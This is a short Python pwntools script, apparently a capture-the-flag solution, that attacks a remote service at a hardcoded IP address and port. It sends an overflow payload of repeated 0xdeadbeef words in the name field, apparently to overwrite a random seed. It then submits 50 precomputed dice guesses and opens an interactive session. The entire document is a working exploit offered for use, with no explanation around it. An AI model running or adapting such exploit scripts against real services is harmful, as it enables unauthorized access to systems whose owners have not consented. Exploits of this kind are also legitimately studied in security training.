from pwn import *	
p=remote("47.96.239.28",9999)
p.readuntil("name:")
p.sendline(p64(0xdeadbeefdeadbeef)*8+p64(0))
ans="25426251423232651155634433322261116425254446323361"
i=0
while i < 50:
	p.readuntil("nt(1~6): ")
	next=ans[i]
	i+=1
	p.sendline(next)
p.interactive()

